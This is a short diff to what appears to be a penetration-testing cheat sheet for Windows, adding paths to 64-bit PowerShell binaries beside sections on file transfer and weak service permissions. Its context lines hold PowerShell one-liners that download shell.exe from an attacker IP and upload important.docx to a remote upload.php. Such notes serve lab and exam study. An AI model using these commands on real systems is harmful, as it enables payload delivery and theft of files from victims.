@@ -102,6 +102,11 @@ $client.DownloadFile("http://10.10.14.3/shell.exe","C:\users\kohsuke\shell.exe")
 powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.199/upload.php', 'important.docx')
 ```
 
+### Hidden bin folder for 64bit
+```
+C:\WINDOWS\sysnative\WindowsPowerShell\v1.0\powershell.exe
+C:\WINDOWS\syswow64\WindowsPowerShell\v1.0\powershell.exe
+```
 ## Common Vuln
 ### Weak service permission
 How to spot
